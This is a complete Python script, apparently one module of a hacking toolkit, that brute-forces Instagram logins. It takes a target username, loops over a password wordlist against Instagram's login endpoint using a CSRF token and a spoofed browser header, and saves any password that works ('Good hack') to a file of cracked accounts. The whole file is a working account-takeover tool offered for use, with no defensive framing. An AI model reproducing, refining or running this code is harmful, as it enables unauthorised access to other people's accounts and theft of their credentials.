import os
import sys
import json
from time import sleep
from datetime import datetime
import requests

normal_color = "\33[00m"
info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
whiteB_color = "\033[1;37m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"



def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def attempt_login(session, username, password, csrf_token):
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    time = int(datetime.now().timestamp())
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf_token
    }
    return session.post(login_url, data=payload, headers=headers)

def read_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print("Password file not found.")
        sys.exit(1)

def get_csrf_token(session):
    link = 'https://www.instagram.com/accounts/login/'
    req = session.get(link)
    return req.cookies.get('csrftoken', None)

import os

def main():
    print('')
    username = input(end_banner_color + "Username => ")
    passwords_file = ("Settings/pass/pass.txt")
    passwords = read_passwords(passwords_file)
    
    with requests.Session() as session:
        csrf_token = get_csrf_token(session)
        if not csrf_token:
            print("CSRFTOKEN not found in cookies")
            return
        for password in passwords:
            response = attempt_login(session, username, password, csrf_token)
            if 'checkpoint_url' in response.text or 'userId' in response.text:
                print((red_color + ' --> Username : ' + green_color + username + red_color + ' --> Password : ' + green_color + password + ' --> Good hack'))
                try:
                    file_path = os.path.join('Settings', 'good', 'instagram_good.txt')
                    with open(file_path, 'a') as x:
                        x.write(username + ':' + password + '\n')
                except Exception as e:
                    print(f"Error when creating or writing to instagram_good.txt: {e}")
                break
            if 'error' in response.text:
                print((normal_color+'' + ' --> Username : ' + end_banner_color + username + red_color + ' --> Password : ' + end_banner_color + password + red_color + ' --> Sorry, there was a problem'))
            elif 'status' in response.text:
                print(end_banner_color + "---------------------------------------")
                print((red_color + ' --> Username : ' + end_banner_color + username + red_color +' --> Password : '+ end_banner_color + password + red_color +' --> Error'))




if __name__ == "__main__":
    main()
    input("[x] Appuyer sur entrée pour retourner au menu principal.")
    os.system('python ../../main.py')